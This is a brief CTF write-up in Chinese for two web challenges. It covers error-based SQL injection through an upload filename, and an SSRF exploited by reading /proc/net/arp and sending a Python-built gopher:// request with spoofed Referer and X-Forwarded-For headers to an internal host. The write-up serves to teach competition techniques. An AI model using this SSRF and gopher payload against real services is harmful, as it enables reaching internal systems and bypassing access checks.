# 2022-网刃杯-Web-Writeup

## upload

上传文件之后测试filename可以SQL注入，直接报错注flag库即可：

![img](2022-网刃杯-Web-Writeup.assets/Y$H8FXN_S``N0NCS1{AT}D.png)

## Sign_in

有个SSRF，读`/proc/net/arp`看内网，发现`172.73.26.100`需要get传a然后post传b，ip是本地然后从`bolean.club`访问，直接拿以前的脚本发过去就行：

```python
import urllib
import requests
import urllib.parse
import re
url='http://124.222.173.163:20003?url='
test =\
"""POST /?a HTTP/1.1
Host: 172.73.26.100:80
Referer:bolean.club
X-Forwarded-For:127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length:1

b
"""  
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
result=urllib.parse.quote(result)
exp='gopher://172.73.26.100:80/'+result
print(requests.get(url=url+exp).text)
```

